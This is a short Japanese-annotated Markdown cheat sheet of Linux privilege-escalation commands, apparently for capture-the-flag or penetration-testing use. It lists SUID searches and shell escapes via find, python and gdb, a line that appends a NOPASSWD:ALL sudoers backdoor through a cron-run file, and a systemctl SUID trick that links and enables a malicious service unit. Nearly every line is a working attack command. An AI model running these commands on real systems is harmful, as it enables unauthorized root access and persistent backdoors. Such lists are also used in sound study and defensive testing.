# Using Shell Command

## findで権限昇格

``` shell
    find / -type f -perm -u=s 2/dev/null

    find . -exec /bin/bash -p \; -quit
```

## pythonで権限昇格

``` shell
    python -c 'import os;os.system("/bin/sh -p")'
```

## sudoers

``` shell
    echo 'echo "vuln ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > <cronに使用されているファイル>
```

## gdbで権限昇格

``` shell
    # gdb起動
    gdb
    help shell
    # shell実行でroot権限でshellを実行できる。
    shell
```

## systemctlで権限昇格

``` shell
    #install -mでモード指定
    sudo install -m =xs $(which systemctl) .
    #serviceの作成
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    #リンクの生成
    ./systemctl link $TF
    #サービスの有効化
    ./systemctl enable --now $TF
```
